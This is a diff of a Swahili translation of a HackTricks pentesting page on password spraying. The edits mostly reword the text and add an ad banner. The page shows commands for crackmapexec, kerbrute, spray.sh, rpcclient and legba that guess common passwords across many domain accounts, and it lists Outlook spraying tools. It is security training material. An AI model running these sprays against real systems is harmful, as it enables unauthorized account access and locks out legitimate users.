@@ -15,18 +15,24 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 ## **Password Spraying**
 
-Mara tu unapokuwa umepata **majina halali ya watumiaji** kadhaa unaweza kujaribu **nenosiri za kawaida zaidi** (zingatia sera ya nenosiri ya mazingira) kwa kila mmoja wa watumiaji walio gundulika.\
-Kwa **kawaida** **urefu wa chini** wa **nenosiri** ni **7**.
+Mara tu umepata **majina halali ya watumiaji** kadhaa unaweza kujaribu **nywila za kawaida zaidi** (zingatia sera ya nywila ya mazingira) na kila mmoja wa watumiaji waliogunduliwa.\
+Kwa **kawaida** **urefu wa chini** wa **nywila** ni **7**.
 
 Orodha za majina ya watumiaji wa kawaida pia zinaweza kuwa na manufaa: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
-Kumbuka kwamba **unaweza kufunga baadhi ya akaunti ikiwa utajaribu nenosiri kadhaa zisizo sahihi** (kwa kawaida zaidi ya 10).
+Kumbuka kwamba **unaweza kufunga akaunti kadhaa ikiwa utajaribu nywila kadhaa zisizo sahihi** (kwa kawaida zaidi ya 10).
 
-### Pata sera ya nenosiri
+### Pata sera ya nywila
 
-Ikiwa una baadhi ya akreditivu za mtumiaji au shell kama mtumiaji wa kikoa unaweza **kupata sera ya nenosiri kwa**:
+Ikiwa una baadhi ya akidi za mtumiaji au shell kama mtumiaji wa kikoa unaweza **kupata sera ya nywila kwa**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -68,11 +74,11 @@ spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
 ```
-* Na moduli ya `scanner/smb/smb_login` ya **Metasploit**:
+* Pamoja na moduli ya `scanner/smb/smb_login` ya **Metasploit**:
 
 ![](<../../.gitbook/assets/image (745).png>)
 
-* Kwa kutumia **rpcclient**:
+* Kutumia **rpcclient**:
 ```bash
 # https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
 for u in $(cat users.txt); do
@@ -109,11 +115,11 @@ legba kerberos --target 127.0.0.1 --username admin --password wordlists/password
 
 Kuna zana nyingi za p**assword spraying outlook**.
 
-* Na [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
-* na [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
-* Na [Ruler](https://github.com/sensepost/ruler) (inaaminika!)
-* Na [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
-* Na [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
+* Pamoja na [MSF Owa\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/)
+* pamoja na [MSF Owa\_ews\_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_ews\_login/)
+* Pamoja na [Ruler](https://github.com/sensepost/ruler) (inaaminika!)
+* Pamoja na [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
+* Pamoja na [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
 Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / orodha ndogo ya nenosiri za kupuliza.
 ```bash
@@ -134,24 +140,31 @@ Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na nenosiri / oro
 * [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
 * [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)
 
-## Marejeo
+## Marejeleo
 
 * [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
 * [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
 * [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
 * [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
 
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
-* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **fuata** sisi kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
